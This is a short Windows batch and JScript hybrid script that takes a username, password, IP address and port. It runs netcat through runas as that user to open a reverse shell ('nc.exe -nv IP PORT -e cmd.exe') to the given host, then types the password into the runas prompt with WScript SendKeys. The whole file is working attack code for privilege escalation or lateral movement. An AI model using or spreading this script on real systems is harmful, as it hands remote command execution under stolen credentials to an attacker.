@if (@CodeSection == @Batch) @then
@echo off

::#############################################################################
set MY_NAME=%~n0
if [%1]==[] goto usage
if [%2]==[] goto usage
if [%3]==[] goto usage
if [%4]==[] goto usage
if not [%5]==[] goto usage

set USER=%1
set PASS=%2
set IP=%3
set PORT=%4

start "" runas /user:%USER% "nc.exe -nv %IP% %PORT% -e cmd.exe"
CScript //nologo //E:JScript "%~F0" "%PASS%{ENTER}"
goto :eof
::#############################################################################
:usage
echo Usage: %MY_NAME% ^<user^> ^<pass^> ^<ip^> ^<port^>
goto :eof
::#############################################################################
@end
WScript.CreateObject("WScript.Shell").SendKeys(WScript.Arguments(0));

